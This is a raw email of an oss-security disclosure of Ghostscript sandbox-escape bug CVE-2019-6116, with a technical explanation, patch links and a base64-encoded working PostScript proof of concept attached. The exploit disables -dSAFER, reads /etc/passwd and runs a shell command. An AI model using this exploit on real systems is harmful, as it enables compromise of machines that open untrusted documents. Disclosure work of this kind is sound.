X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["17903" "Wednesday" "23" "January" "2019" "06:38:09" "-0800" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkL2qMdEj6Y6BFy6tohxELAXA5Vap_GGAtNaQ3Ko68PM8A@mail.gmail.com>" "331" "[oss-security] ghostscript: subroutines within pseudo-operators must themselves be pseudo-operators" "^Date:" nil nil "1" "2019012314:38:09" "[oss-security] ghostscript: subroutines within pseudo-operators must themselves be pseudo-operators" (number mark "U       taviso@googl Jan 23  331/17903 " thread-indent "\"[oss-security] ghostscript: subroutines within pseudo-operators must themselves be pseudo-operators\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19777 invoked by uid 550); 23 Jan 2019 14:38:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19740 invoked from network); 23 Jan 2019 14:38:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=1ralKYNckJl1JpcF1tMq/n/EXN79rInuNwWq/oq68uE=;
        b=r0+0c0rURkzUxtzkgdTgjUa2cxtoWoC0h346IofajIWGoB56iwOkvLEZib9u5ln5KM
         FOIfFoKZtk0I871Q85cn/ZW2RpIcsuUCxqy0ND+4ILQ9AvnHYxEnCJ9bG3eQWzFqO/YX
         VQfwNexylStJ7jgW89RyhYC1Kf7KTw0VCvKH6drh42I7Zs3WBnQy3sBgTGH7yYEQfXfk
         jAH0V+ITgfLWFiBMCamuZKhyNTvYTCtcpuzUhgXDAUcBg1U/Z7oQWNrbk1EU6NMui2+X
         rmKGBJvaE9H4Epa02/KZwUegBW7NudSQqxk/Qupbm9eRlH26Exb0YfqZ/1dJjcxCWf6t
         kBLg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=1ralKYNckJl1JpcF1tMq/n/EXN79rInuNwWq/oq68uE=;
        b=VOgekBCat/F9dcIru6puQh1xtQIcvYg1cMQLXiPR+/Gy6R2DkYra55f87/SsX15sZW
         bm/Z3C6rJ78xG71yvgADq+PIImeTNxZehmVua5ZZn/mc03G2Fe/yA/IoGJX52gAdGEu0
         5n7VRFgFm3ypMd0zu1N3ppir2+FHpHcTzQD5nlL8onwOQLXCQInftxqymezAt1waxx7G
         PXP6W3fNn7VSI8zTLoRYNC/Aaeww3F3cldIqGyHK6St7gXmtXEszGcURDBmfcj3yuBYJ
         iwhpgxs7EviGLAVeJBYsSmpm1KU4ch26fR+/S2aGKGGXZtjPEdV2Id9mC4SeER48LcZn
         ZJqw==
X-Gm-Message-State: AJcUukfT9p8o4OPxuvr6CPtEXEVB2fwNbbLtwNxaqzz0dYJy5V+Ix8O+
	dEtOeZhlWaxMiBJwvngkrzCrIVrZH0EG0a4K3achkTidqT+qcQ==
X-Google-Smtp-Source: ALg8bN6C0p15CF/lIoFf26d8tvF/KW8cZHx2r6AKc08PNipCusygFlVMnYwO3Aur1I28FQ0VncNwTf5/TAMhsBVqIqQ=
X-Received: by 2002:ac8:6c3:: with SMTP id j3mr2502745qth.84.1548254299838;
 Wed, 23 Jan 2019 06:38:19 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAJ_zFkL2qMdEj6Y6BFy6tohxELAXA5Vap_GGAtNaQ3Ko68PM8A@mail.gmail.com>
Content-Type: multipart/mixed; boundary="00000000000090d3ca0580210b09"
Date: Wed, 23 Jan 2019 06:38:09 -0800
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] ghostscript: subroutines within pseudo-operators must themselves be pseudo-operators
To: oss-security@lists.openwall.com

--00000000000090d3ca0580210b09
Content-Type: multipart/alternative; boundary="00000000000090d3c80580210b07"

--00000000000090d3c80580210b07
Content-Type: text/plain; charset="UTF-8"

Hello, I noticed ghostscript 9.26 was released, so decided to take a look
and noticed some problems. For background, this is how you define a
subroutine in postscript:

/hello {
    (hello\n) print
} def

That's simple enough, but because a subroutine is just an executable array
of commands, you need to mark it as executeonly if you're using powerful
system operators. That way, users can't peek inside and get references to
operators they shouldn't be allowed to use.

/hello {
    (hello\n) print
} executeonly def

That's still not enough though, because the routine might expose the
contents to error handlers, so you also need to make it a pseudo-operator
with odef. PostScript error handlers don't examine any deeper than the
current operator (or pseudo-operator), so won't expose any of the contents
if they stop.

/hello {
    (hello\n) print
} executeonly odef

Looks good, but it gets weirder. If you don't bind the contents, then name
resolution happens on execution, not when you define it. That means that
someone can change the dictstack (which kind of works like variable scope
in other languages) so that commands and operators do something different
than when you defined the subroutine.

Like this:

GS>/hello { (hello\n) print } executeonly odef
GS><< /print { (goodbye)= pop } >> begin
GS>hello
goodbye

This means you also need to bind the routine, and also be very aware when
you're writing it of what is and what isn't an operator at define-time
(nobody ever said writing postscript was easy, lol). So now we have this:

/hello {
    (hello\n) print
} bind executeonly odef

I think that's good enough for simple routines, but what if it's more
complicated? The way you branch in PostScript is to create an ephemeral
subroutine and pass it to the `if` or `ifelse` operators, like this:

/hello {
    time 1200 lt {
        (good morning\n) print
    } {
        (good afternoon\n) print
    } ifelse
} bind executeonly odef

Do those ephemeral routines also need to be protected? The answer is *yes*,
they're pushed on the operand stack just like everything else, so can cause
errors like /stackoverflow or /execstackoverflow and will then be exposed
to error handlers. In my opinion, this is a language specification flaw in
PostScript.

Regardless, ghostscript didn't protect a whole bunch of these ephemeral
routines, here is one example, but there were dozens:

http://git.ghostscript.com/?p=ghostpdl.git;a=blob;f=Resource/Init/pdf_draw.ps;h=79733df451c1ecc0a71b08d10e5412ac3e243a9e;hb=gs926#l1123

1123       {
1124         currentglobal pdfdict gcheck .setglobal
1125         pdfdict /.Qqwarning_issued //true .forceput
1126         .setglobal
1127         pdfformaterror
1128       } ifelse

You can see the routine itself is bound, executeonly and odef, but the
ephemeral routines inside it used for conditions and loops are not
protected.

These bugs are starting to get trickier to exploit, you have to make an
operator fail very precisely, but I made a demo that works in 9.26. This
uses the trick I described above of taking over names that couldn't be
resolved at define time by pushing a new dict on the dictstack. This gives
me a high degree of control over the routine.

$ gs -dSAFER -f ghostscript-926-forceput.ps
GPL Ghostscript 9.26 (2018-11-20)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
Stage 0: PDFfile
Stage 1: q
Stage 3: oget
Stage 4: pdfemptycount
Stage 5: gput
Stage 6: resolvestream
Stage 7: pdfopdict
Stage 8: .pdfruncontext
Stage 9: pdfdict
Stage 10: /typecheck #1
Stage 10: /typecheck #2
Stage 11: Exploitation...
Should now have complete control over ghostscript, attempting to read
/etc/passwd...
(root:x:0:0:root:/root:/bin/bash)
Attempting to execute a shell command...
uid=1000(taviso) gid=1000(primarygroup)
groups=1000(primarygroup),4(adm),20(dialout),24(cdrom),25(floppy),44(video),46(plugdev),999(logindev)

This exploit should work via evince, ImageMagick, nautilus, less (just
rename it exploit.pcd), gimp, gv, etc, etc. It might require some
adjustment to work on older versions, but 9.26 and earlier are all
affected. Do not count on AppArmor protecting you, the policy is *very*
relaxed.

The patch required to protect ghostscript from attacks like this was
non-trivial, and took a significant amount of work, these patches are
required:

http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=13b0a36f8181db66a91bcc8cea139998b53a8996
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=2db98f9c66135601efb103d8db7d020a672308db
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=99f13091a3f309bdc95d275ea9fec10bb9f42d9a
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=59d8f4deef90c1598ff50616519d5576756b4495
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=2768d1a6dddb83f5c061207a7ed2813999c1b5c9
http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=49c8092da88ef6bb0aa281fe294ae0925a44b5b9

This was Project Zero issue 1729
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1729>,
Ghostscript issue 700317
<https://bugs.ghostscript.com/show_bug.cgi?id=700317>, and CVE-2019-6116.

Thanks, Tavis.

p.s. I'm not regularly looking at ghostscript, this was just a random look
at the new release.

#DeprecateUntrustedPostscript

--00000000000090d3c80580210b07
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div di=
r=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"lt=
r"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div dir=3D"ltr"><div=
 dir=3D"ltr"><div>Hello, I noticed ghostscript 9.26 was released, so decide=
d to take a look and noticed some problems. For background, this is how you=
 define a subroutine in postscript:</div><div><br></div><div>/hello {</div>=
<div>=C2=A0 =C2=A0 (hello\n) print</div><div>} def</div><div><br></div><div=
>That&#39;s simple enough, but because a subroutine is just an executable a=
rray of commands, you need to mark it as executeonly if you&#39;re using po=
werful system operators. That way, users can&#39;t peek inside and get refe=
rences to operators they shouldn&#39;t be allowed to use.</div><div><br></d=
iv><div>/hello {</div><div>=C2=A0 =C2=A0 (hello\n) print</div><div>} execut=
eonly def</div><div><br></div><div>That&#39;s still not enough though, beca=
use the routine might expose the contents to error handlers, so you also ne=
ed to make it a pseudo-operator with odef. PostScript error handlers don&#3=
9;t examine any deeper than the current operator (or pseudo-operator), so w=
on&#39;t expose any of the contents if they stop.</div><div><br></div><div>=
/hello {</div><div>=C2=A0 =C2=A0 (hello\n) print</div><div>} executeonly od=
ef</div><div><br></div><div>Looks good, but it gets weirder. If you don&#39=
;t bind the contents, then name resolution happens on execution, not when y=
ou define it. That means that someone can change the dictstack (which kind =
of works like variable scope in other languages) so that commands and opera=
tors do something different than when you defined the subroutine.</div><div=
><br></div><div>Like this:</div><div><br></div><div>GS&gt;/hello { (hello\n=
) print } executeonly odef</div><div>GS&gt;&lt;&lt; /print { (goodbye)=3D p=
op } &gt;&gt; begin=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0=C2=A0</div><div>GS&gt=
;hello</div><div>goodbye</div><div><br></div><div>This means you also need =
to bind the routine, and also be very aware when you&#39;re writing it of w=
hat is and what isn&#39;t an operator at define-time (nobody ever said writ=
ing postscript was easy, lol). So now we have this:</div><div><br></div><di=
v>/hello {</div><div>=C2=A0 =C2=A0 (hello\n) print</div><div>} bind execute=
only odef</div><div><br></div><div>I think that&#39;s good enough for simpl=
e routines, but what if it&#39;s more complicated? The way you branch in Po=
stScript is to create an ephemeral subroutine and pass it to the `if` or `i=
felse` operators, like this:</div><div><br></div><div>/hello {</div><div>=
=C2=A0 =C2=A0 time 1200 lt {</div><div>=C2=A0 =C2=A0 =C2=A0 =C2=A0 (good mo=
rning\n) print</div><div>=C2=A0 =C2=A0 } {</div><div>=C2=A0 =C2=A0 =C2=A0 =
=C2=A0 (good afternoon\n) print</div><div>=C2=A0 =C2=A0 } ifelse</div><div>=
} bind executeonly odef</div><div><br></div><div>Do those ephemeral routine=
s also need to be protected? The answer is *yes*, they&#39;re pushed on the=
 operand stack just like everything else, so can cause errors like /stackov=
erflow or /execstackoverflow and will then be exposed to error handlers. In=
 my opinion, this is a language specification flaw in PostScript.=C2=A0=C2=
=A0</div><div><br></div><div>Regardless, ghostscript didn&#39;t protect a w=
hole bunch of these ephemeral routines, here is one example, but there were=
 dozens:</div><div><br></div><div><a href=3D"http://git.ghostscript.com/?p=
=3Dghostpdl.git;a=3Dblob;f=3DResource/Init/pdf_draw.ps;h=3D79733df451c1ecc0=
a71b08d10e5412ac3e243a9e;hb=3Dgs926#l1123" target=3D"_blank">http://git.gho=
stscript.com/?p=3Dghostpdl.git;a=3Dblob;f=3DResource/Init/pdf_draw.ps;h=3D7=
9733df451c1ecc0a71b08d10e5412ac3e243a9e;hb=3Dgs926#l1123<br></a></div><div>=
<br></div><div>1123=C2=A0 =C2=A0 =C2=A0 =C2=A0{</div><div>1124=C2=A0 =C2=A0=
 =C2=A0 =C2=A0 =C2=A0currentglobal pdfdict gcheck .setglobal</div><div>1125=
=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0pdfdict /.Qqwarning_issued //true .forcep=
ut</div><div>1126=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0.setglobal</div><div>112=
7=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0pdfformaterror</div><div>1128=C2=A0 =C2=
=A0 =C2=A0 =C2=A0} ifelse</div><div><br></div><div>You can see the routine =
itself is bound, executeonly and odef, but the ephemeral routines inside it=
 used for conditions and loops are not protected.</div><div><br></div><div>=
These bugs are starting to get trickier to exploit, you have to make an ope=
rator fail very precisely, but I made a demo that works in 9.26. This uses =
the trick I described above of taking over names that couldn&#39;t be resol=
ved at define time by pushing a new dict on the dictstack. This gives me a =
high degree of control over the routine.</div><div><br></div><div>$ gs -dSA=
FER -f <a href=3D"http://ghostscript-926-forceput.ps" target=3D"_blank">gho=
stscript-926-forceput.ps</a>=C2=A0</div><div>GPL Ghostscript 9.26 (2018-11-=
20)<br></div><div><div>Copyright (C) 2018 Artifex Software, Inc.=C2=A0 All =
rights reserved.</div><div>This software comes with NO WARRANTY: see the fi=
le PUBLIC for details.</div><div>Stage 0: PDFfile</div><div>Stage 1: q</div=
><div>Stage 3: oget</div><div>Stage 4: pdfemptycount</div><div>Stage 5: gpu=
t</div><div>Stage 6: resolvestream</div><div>Stage 7: pdfopdict</div><div>S=
tage 8: .pdfruncontext</div><div>Stage 9: pdfdict</div><div>Stage 10: /type=
check #1</div><div>Stage 10: /typecheck #2</div><div>Stage 11: Exploitation=
...</div><div>Should now have complete control over ghostscript, attempting=
 to read /etc/passwd...</div><div>(root:x:0:0:root:/root:/bin/bash)</div><d=
iv>Attempting to execute a shell command...</div><div>uid=3D1000(taviso) gi=
d=3D1000(primarygroup) groups=3D1000(primarygroup),4(adm),20(dialout),24(cd=
rom),25(floppy),44(video),46(plugdev),999(logindev)</div></div><div><br></d=
iv><div>This exploit should work via evince, ImageMagick, nautilus, less (j=
ust rename it exploit.pcd), gimp, gv, etc, etc. It might require some adjus=
tment to work on older versions, but 9.26 and earlier are all affected. Do =
not count on AppArmor protecting you, the policy is *very* relaxed.</div><d=
iv><br></div><div>The patch required to protect ghostscript from attacks li=
ke this was non-trivial, and took a significant amount of work, these patch=
es are required:</div><div><br></div><div><a href=3D"http://git.ghostscript=
.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D13b0a36f8181db66a91bcc8cea139998b=
53a8996">http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D13=
b0a36f8181db66a91bcc8cea139998b53a8996<br></a></div><div><a href=3D"http://=
git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D2db98f9c66135601ef=
b103d8db7d020a672308db">http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dco=
mmitdiff;h=3D2db98f9c66135601efb103d8db7d020a672308db<br></a></div><div><a =
href=3D"http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D99f=
13091a3f309bdc95d275ea9fec10bb9f42d9a">http://git.ghostscript.com/?p=3Dghos=
tpdl.git;a=3Dcommitdiff;h=3D99f13091a3f309bdc95d275ea9fec10bb9f42d9a</a><br=
></div><div><a href=3D"http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcom=
mitdiff;h=3D59d8f4deef90c1598ff50616519d5576756b4495">http://git.ghostscrip=
t.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D59d8f4deef90c1598ff50616519d5576=
756b4495<br></a></div><div><a href=3D"http://git.ghostscript.com/?p=3Dghost=
pdl.git;a=3Dcommitdiff;h=3D2768d1a6dddb83f5c061207a7ed2813999c1b5c9">http:/=
/git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D2768d1a6dddb83f5c=
061207a7ed2813999c1b5c9<br></a></div><div><a href=3D"http://git.ghostscript=
.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D49c8092da88ef6bb0aa281fe294ae0925=
a44b5b9">http://git.ghostscript.com/?p=3Dghostpdl.git;a=3Dcommitdiff;h=3D49=
c8092da88ef6bb0aa281fe294ae0925a44b5b9<br></a></div><div><br></div><div>Thi=
s was Project Zero <a href=3D"https://bugs.chromium.org/p/project-zero/issu=
es/detail?id=3D1729" target=3D"_blank">issue 1729</a>, Ghostscript <a href=
=3D"https://bugs.ghostscript.com/show_bug.cgi?id=3D700317" target=3D"_blank=
">issue=C2=A0700317</a>, and=C2=A0CVE-2019-6116.</div><div><br></div><div>T=
hanks, Tavis.</div><div><br></div><div>p.s. I&#39;m not regularly looking a=
t ghostscript, this was just a random look at the new release.=C2=A0</div><=
div><br></div><div>#DeprecateUntrustedPostscript</div><div><br></div></div>=
</div></div></div></div></div></div></div></div></div></div></div></div></d=
iv>

--00000000000090d3c80580210b07--

--00000000000090d3ca0580210b09
Content-Type: application/postscript; 
	name="ghostscript-926-forceput-typecheck-example.ps"
Content-Disposition: attachment; 
	filename="ghostscript-926-forceput-typecheck-example.ps"
Content-Transfer-Encoding: base64
Content-ID: <f_jr85njee1>
X-Attachment-Id: f_jr85njee1

JSFQUwolIGV4dHJhY3QgLmFjdHVhbF9wZGZwYWludHByb2Mgb3BlcmF0b3Ig
ZnJvbSBwZGZkaWN0Ci8uYWN0dWFsX3BkZnBhaW50cHJvYyBwZGZkaWN0IC8u
YWN0dWFsX3BkZnBhaW50cHJvYyBnZXQgZGVmCgovZXhwbG9pdCB7CiAgICAo
U3RhZ2UgMTE6IEV4cGxvaXRhdGlvbi4uLik9CgogICAgL2ZvcmNlcHV0IGV4
Y2ggZGVmCgogICAgc3lzdGVtZGljdCAvU0FGRVIgZmFsc2UgZm9yY2VwdXQK
ICAgIHVzZXJwYXJhbXMgL0xvY2tGaWxlUGVybWlzc2lvbnMgZmFsc2UgZm9y
Y2VwdXQKICAgIHN5c3RlbWRpY3QgL3VzZXJwYXJhbXMgZ2V0IC9QZXJtaXRG
aWxlQ29udHJvbCBbKCopXSBmb3JjZXB1dAogICAgc3lzdGVtZGljdCAvdXNl
cnBhcmFtcyBnZXQgL1Blcm1pdEZpbGVXcml0aW5nIFsoKildIGZvcmNlcHV0
CiAgICBzeXN0ZW1kaWN0IC91c2VycGFyYW1zIGdldCAvUGVybWl0RmlsZVJl
YWRpbmcgWygqKV0gZm9yY2VwdXQKCiAgICAlIHVwZGF0ZQogICAgc2F2ZSBy
ZXN0b3JlCgogICAgJSBBbGwgZG9uZS4KICAgIHN0b3AKfSBkZWYKCmVycm9y
ZGljdCAvdHlwZWNoZWNrIHsKICAgIC90eXBlY291bnQgdHlwZWNvdW50IDEg
YWRkIGRlZgogICAgKFN0YWdlIDEwOiAvdHlwZWNoZWNrICMpPW9ubHkgdHlw
ZWNvdW50ID09CgogICAgJSBUaGUgZmlyc3QgZXJyb3Igd2lsbCBiZSB0aGUg
Lmtub3duZ2V0LCB3aGljaCB3ZSBoYW5kbGUgYW5kIHNldHVwIHRoZQogICAg
JSBzdGFjay4gVGhlIHNlY29uZCBlcnJvciB3aWxsIGJlIHRoZSBpZmVsc2Ug
KG1pc3NpbmcgYm9vbGVhbiksIGFuZCB0aGVuIHdlCiAgICAlIGR1bXAgdGhl
IG9wZXJhbmRzLgogICAgdHlwZWNvdW50IDEgZXEgeyBudWxsIH0gaWYKICAg
IHR5cGVjb3VudCAyIGVxIHsgcG9wIDcgZ2V0IGV4cGxvaXQgfSBpZgogICAg
dHlwZWNvdW50IDMgZXEgeyAodW5leHBlY3RlZCk9IHF1aXQgfSAgaWYKfSBw
dXQKCiUgVGhlIHBzZXVkby1vcGVyYXRvciAuYWN0dWFsX3BkZnBhaW50cHJv
YyBmcm9tIHBkZl9kcmF3LnBzIHB1c2hlcyBzb21lCiUgZXhlY3V0YWJsZSBl
cnJheXMgb250byB0aGUgb3BlcmFuZCBzdGFjayB0aGF0IGNvbnRhaW4gLmZv
cmNlcHV0LCBidXQgYXJlIG5vdAolIG1hcmtlZCBhcyBleGVjdXRlb25seSBv
ciBwc2V1ZG8tb3BlcmF0b3JzLgolCiUgVGhlIHJvdXRpbmUgd2FzIGF0dGVt
cHRpbmcgdG8gcGFzcyB0aGVtIHRvIGlmZWxzZSwgYnV0IHdlIGNhbiBjYXVz
ZSB0aGF0IHRvCiUgZmFpbCBiZWNhdXNlIHdoZW4gdGhlIHJvdXRpbmUgd2Fz
IGRlY2xhcmVkLCBpdCB1c2VkIGBiaW5kYCBidXQgbWFueSBvZiB0aGUKJSBu
YW1lcyBpdCB1c2VzIGFyZSBub3Qgb3BlcmF0b3JzIGFuZCBzbyBhcmUganVz
dCBsb29rZWQgdXAgaW4gdGhlIGRpY3RzdGFjay4KJQolIFRoaXMgbWVhbnMg
d2UgY2FuIHB1c2ggYSBkaWN0IG9udG8gdGhlIGRpY3RzdGFjayBhbmQgY29u
dHJvbCBob3cgdGhlIHJvdXRpbmUKJSB3b3Jrcy4KPDwKICAgIC90eXBlY291
bnQgICAgICAwCiAgICAvUERGZmlsZSAgICAgICAgeyAoU3RhZ2UgMDogUERG
ZmlsZSk9IGN1cnJlbnRmaWxlIH0KICAgIC9xICAgICAgICAgICAgICB7IChT
dGFnZSAxOiBxKT0gfSAlIG5vLW9wCiAgICAvb2dldCAgICAgICAgICAgeyAo
U3RhZ2UgMzogb2dldCk9IHBvcCBwb3AgMCB9ICUgY2xlYXIgc3RhY2sKICAg
IC9wZGZlbXB0eWNvdW50ICB7IChTdGFnZSA0OiBwZGZlbXB0eWNvdW50KT0g
fSAlIG5vLW9wCiAgICAvZ3B1dCAgICAgICAgICAgeyAoU3RhZ2UgNTogZ3B1
dCk9IH0gICUgbm8tb3AKICAgIC9yZXNvbHZlc3RyZWFtICB7IChTdGFnZSA2
OiByZXNvbHZlc3RyZWFtKT0gfSAlIG5vLW9wCiAgICAvcGRmb3BkaWN0ICAg
ICAgeyAoU3RhZ2UgNzogcGRmb3BkaWN0KT0gfSAlIG5vLW9wCiAgICAvLnBk
ZnJ1bmNvbnRleHQgeyAoU3RhZ2UgODogLnBkZnJ1bmNvbnRleHQpPSAwIDEg
bWFyayB9ICUgc2F0aXNmeSBjb3VudHRvbWFyayBhbmQgaW5kZXgKICAgIC9w
ZGZkaWN0ICAgICAgICB7IChTdGFnZSA5OiBwZGZkaWN0KT0KICAgICAgICAl
IGNhdXNlIGEgL3R5cGVjaGVjayBlcnJvciB3ZSBoYW5kbGUgYWJvdmUKICAg
ICAgICB0cnVlCiAgICB9Cj4+IGJlZ2luIDw8Pj4gPDw+PiB7IC5hY3R1YWxf
cGRmcGFpbnRwcm9jIH0gc3RvcHBlZCBwb3AKCihTaG91bGQgbm93IGhhdmUg
Y29tcGxldGUgY29udHJvbCBvdmVyIGdob3N0c2NyaXB0LCBhdHRlbXB0aW5n
IHRvIHJlYWQgL2V0Yy9wYXNzd2QuLi4pPQoKJSBEZW1vbnN0cmF0ZSByZWFk
aW5nIGEgZmlsZSB3ZSBzaG91bGRudCBoYXZlIGFjY2VzcyB0by4KKC9ldGMv
cGFzc3dkKSAocikgZmlsZSBkdXAgNjQgc3RyaW5nIHJlYWRsaW5lIHBvcCA9
PSBjbG9zZWZpbGUKCihBdHRlbXB0aW5nIHRvIGV4ZWN1dGUgYSBzaGVsbCBj
b21tYW5kLi4uKT0gZmx1c2gKCiUgcnVuIGNvbW1hbmQKKCVwaXBlJWlkKSAo
dykgZmlsZSBjbG9zZWZpbGUKCihBbGwgZG9uZS4pPQoKcXVpdAo=

--00000000000090d3ca0580210b09--
